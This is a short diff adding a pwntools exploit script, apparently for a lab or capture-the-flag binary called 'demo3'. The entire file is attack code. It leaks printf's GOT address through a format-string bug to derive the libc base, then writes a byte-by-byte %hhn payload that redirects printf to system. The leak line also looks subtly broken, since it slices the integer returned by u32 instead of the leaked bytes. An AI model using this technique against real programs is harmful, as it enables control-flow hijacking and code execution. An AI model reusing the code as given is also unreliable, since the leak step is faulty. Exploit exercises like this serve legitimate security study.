@@ -1,0 +1,40 @@
+from pwn import *
+
+p=process("./demo3")
+libc=ELF("/lib/i386-linux-gnu/libc.so.6")
+
+printf_got=0x804a00c
+
+
+# Find these offset 
+printf_off=libc.symbols["printf"]
+system_off=libc.symbols["system"]
+
+
+def fmt(s):
+	p.sendline(s)
+	d = p.recv()
+	return d
+
+# Calculate libc base address by leaking printf@got
+payload=p32(printf_got)+'%5$s'
+base = u32(fmt(p32(printf_got)+'%5$s'))[4:8]-printf_off
+system = base + system_off
+print 'Libc base:', hex(base)
+
+
+
+# Prepare %hhn format string
+r = ''.join(p32(printf_got+i) for i in range(4))
+printed = 16	
+for i in range(4):
+	byte = (system >> (i*8)) & 0xff # value of byte[i]
+	pad = ((byte - printed) % 256 + 256) % 256
+	if pad > 0:
+		r += '%%%dc' % (pad)
+	r += '%%%d$hhn' % (5+i)
+	printed +=pad
+
+
+# Overwrite printf() to system
+fmt(r)
